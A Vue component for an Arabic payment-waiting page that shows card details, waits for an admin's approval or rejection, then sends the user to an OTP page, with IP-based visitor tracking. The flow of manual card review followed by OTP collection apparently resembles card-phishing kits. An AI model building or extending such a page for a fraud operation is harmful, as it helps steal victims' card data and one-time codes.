<template>
    <div class="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100 flex flex-col items-center justify-center py-4 sm:py-6 px-3 sm:px-4"
        dir="rtl">
        <div class="bg-white rounded-2xl shadow-lg border border-slate-100 overflow-hidden w-full"
            style="max-width: 420px">

            <!-- Header -->
            <div class="bg-gradient-to-l from-primary to-blue-700 py-5 sm:py-6 px-4 text-center">
                <div class="mb-4">
                    <!-- Animated Loading Icon -->
                    <div class="relative inline-flex">
                        <div class="absolute inset-0 bg-white opacity-20 rounded-full animate-ping"></div>
                        <div class="relative bg-white rounded-full p-4">
                            <svg class="w-10 h-10 sm:w-12 sm:h-12 text-primary animate-pulse" fill="none"
                                stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                            </svg>
                        </div>
                    </div>
                </div>
                <h1 class="text-white text-lg sm:text-xl font-bold">
                    {{ t( 'verification.paymentWaiting.title' ) }}
                </h1>
                <p class="text-blue-100 text-sm mt-2">
                    {{ t( 'verification.paymentWaiting.reviewingCard' ) }}
                </p>
            </div>

            <!-- Content -->
            <div class="p-4 sm:p-6 md:p-8 space-y-5 sm:space-y-6">

                <!-- Status: Pending -->
                <div v-if="paymentStatus === 'pending'" class="text-center">
                    <div
                        class="inline-flex items-center gap-2 bg-amber-50 text-amber-700 border border-amber-200 rounded-full px-4 py-2 text-sm font-medium">
                        <div class="w-2 h-2 bg-amber-500 rounded-full animate-pulse"></div>
                        <span>{{ t( 'verification.paymentWaiting.underReview' ) }}</span>
                    </div>
                    <p class="mt-4 text-sm text-muted">
                        {{ t( 'verification.paymentWaiting.waitingAdmin' ) }}
                    </p>
                </div>

                <!-- Status: Approved -->
                <div v-else-if="paymentStatus === 'approved'" class="text-center">
                    <div
                        class="inline-flex items-center gap-2 bg-green-50 text-green-700 border border-green-200 rounded-full px-4 py-2 text-sm font-medium mb-4">
                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd"
                                d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                                clip-rule="evenodd" />
                        </svg>
                        <span>{{ t( 'verification.paymentWaiting.approved' ) }}</span>
                    </div>
                    <p class="text-sm text-muted">
                        {{ t( 'verification.paymentWaiting.approvedMessage' ) }}
                    </p>
                </div>

                <!-- Status: Rejected -->
                <div v-else-if="paymentStatus === 'rejected'" class="text-center">
                    <div
                        class="inline-flex items-center gap-2 bg-red-50 text-destructive border border-red-200 rounded-full px-4 py-2 text-sm font-medium mb-4">
                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd"
                                d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                                clip-rule="evenodd" />
                        </svg>
                        <span>{{ t( 'verification.paymentWaiting.rejected' ) }}</span>
                    </div>
                    <p class="text-sm text-muted mb-2">
                        {{ friendlyRejectionReason || t( 'verification.paymentWaiting.rejectedMessage' ) }}
                    </p>
                    <p class="text-xs text-slate-400">
                        {{ t( 'verification.paymentWaiting.redirectingPayment' ) }}
                    </p>
                </div>

                <!-- Card Details Summary -->
                <div v-if="cardLast4" class="bg-slate-50 rounded-xl p-4 text-sm text-slate-700 space-y-2">
                    <h3 class="text-sm font-semibold text-foreground mb-3">
                        {{ t( 'verification.paymentWaiting.cardDetails' ) }}
                    </h3>
                    <div class="flex justify-between items-center">
                        <span class="text-muted">{{ t( 'verification.paymentWaiting.cardNumber' ) }}</span>
                        <span class="font-bold ltr-nums" dir="ltr">**** **** **** {{ cardLast4 }}</span>
                    </div>
                    <div v-if="cardHolder" class="flex justify-between items-center">
                        <span class="text-muted">{{ t( 'verification.paymentWaiting.cardHolder' ) }}</span>
                        <span class="font-bold uppercase">{{ cardHolder }}</span>
                    </div>
                    <div v-if="totalAmount > 0" class="flex justify-between items-center">
                        <span class="text-muted">{{ t( 'verification.paymentWaiting.amount' ) }}</span>
                        <span class="font-bold text-primary">
                            <SarIcon className="size-3 inline-block fill-primary" />
                            {{ formattedAmount }}
                        </span>
                    </div>
                </div>

                <!-- Tip Box -->
                <div class="bg-blue-50 border border-blue-100 rounded-xl p-4">
                    <div class="flex gap-3">
                        <svg class="w-5 h-5 text-primary flex-shrink-0 mt-0.5" fill="currentColor"
                            viewBox="0 0 20 20">
                            <path fill-rule="evenodd"
                                d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
                                clip-rule="evenodd" />
                        </svg>
                        <div class="text-sm text-blue-800">
                            <p class="font-semibold mb-1">{{ t( 'verification.paymentWaiting.tip' ) }}</p>
                            <p class="text-xs">{{ t( 'verification.paymentWaiting.tipMessage' ) }}</p>
                        </div>
                    </div>
                </div>

                <!-- Trust Badges & Payment Logos -->
                <div class="pt-4 border-t border-slate-200">
                    <TrustBadges variant="inline" class="mb-4" />
                    <p class="text-center text-muted text-xs sm:text-sm mb-3">
                        {{ t( 'common.paymentBy' ) }}
                    </p>
                    <div class="flex items-center justify-center gap-3 sm:gap-4">
                        <img :src="visaLogo" alt="Visa"
                            class="h-[16px] sm:h-[20px] w-auto" width="50" height="20" />
                        <img :src="mcLogo" alt="MasterCard"
                            class="h-[16px] sm:h-[20px] w-auto" width="32" height="20" />
                        <img :src="madaLogo" alt="Mada"
                            class="h-[16px] sm:h-[20px] w-auto" width="50" height="20" />
                    </div>
                </div>
            </div>

            <!-- Footer -->
            <div class="bg-slate-50 border-t border-slate-100 px-4 py-3 text-center">
                <p class="text-xs text-muted">
                    {{ t( 'verification.paymentWaiting.waitingReview' ) }}
                </p>
            </div>
        </div>

        <!-- Help Section -->
        <div class="mt-4 sm:mt-6 text-center px-4">
            <p class="text-xs sm:text-sm text-muted">
                {{ t( 'common.contactUsIfProblem' ) }}
                <a href="tel:920000000" class="text-secondary font-bold hover:underline text-sm sm:text-base mr-1">
                    920000000
                </a>
            </p>
        </div>

        <!-- Security Badge -->
        <div class="mt-3 sm:mt-4 flex items-center justify-center gap-2 text-slate-400">
            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            <span class="text-xs">{{ t( 'common.secureTransaction' ) }}</span>
        </div>
    </div>
</template>

<script setup>
import { ref, computed, onMounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getCardStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import SarIcon from '@/components/SarIcon.vue';
import TrustBadges from '@/components/ui/TrustBadges.vue';
import { getReasonLabel } from '@/constants/rejectionReasons';
import visaLogo from '../../../images/logo/summary_logo/download (1).png';
import mcLogo from '../../../images/logo/summary_logo/download2.png';
import madaLogo from '../../../images/logo/summary_logo/download3.png';

const { t } = useI18n();
const router = useRouter();

// Track this page
useVisitorTracking( 'payment/waiting' );

// ─── Load context ───────────────────────────────────────────────────
const { context, resolveCustomerIp } = usePayment();
const _sessionId = computed( () => context.sessionId || '' );
const customerIp = ref( context.customerIp || '' );
const cardLast4 = computed( () => context.cardLast4 || '****' );
const cardHolder = computed( () => context.cardHolder || '' );
const totalAmount = computed( () => parseFloat( context.totalAmount ) || 0 );

const formattedAmount = computed( () =>
{
    return totalAmount.value.toLocaleString( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } );
} );

// ─── WebSocket + Polling via composable ─────────────────────────────
const { status: paymentStatus, rejectionReason, setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'payment',
    approvedEvent: 'PaymentApproved',
    rejectedEvent: 'PaymentRejected',
    logTag: 'PaymentWaiting',

    onApproved ( event )
    {
        logger.debug( '[PaymentWaiting] Payment approved:', event );
        // Navigate to OTP page after brief visual feedback
        setTimeout( () =>
        {
            if ( event.redirect_to )
            {
                safeRedirect( event.redirect_to, 'otp', router );
            } else
            {
                router.push( { name: 'otp' } );
            }
        }, 2000 );
    },

    onRejected ( event )
    {
        logger.debug( '[PaymentWaiting] Payment rejected:', event );
        // Navigate back to checkout after brief visual feedback — pass reason via query
        setTimeout( () =>
        {
            router.push( { name: 'checkout', query: { rejectionReason: event.reason || rejectionReason.value || '' } } );
        }, 4000 );
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sessionId = context.sessionId || '';
        const sig = context.statusSigs?.card || '';
        if ( !sessionId || !sig )
        {
            logger.warn( '[PaymentWaiting] Poll skipped — missing sessionId or sig', { sessionId: !!sessionId, sig: !!sig } );
            return;
        }

        const { data } = await getCardStatus( sessionId, sig );

        if ( data.status === 'approved' )
        {
            handleApproved( data );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.rejection_reason || '' } );
        }
    },
} );

const friendlyRejectionReason = computed( () => getReasonLabel( rejectionReason.value, t ) );

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIp.value || await resolveCustomerIp();
    customerIp.value = ip;
    setupWs( ip );
} );
</script>
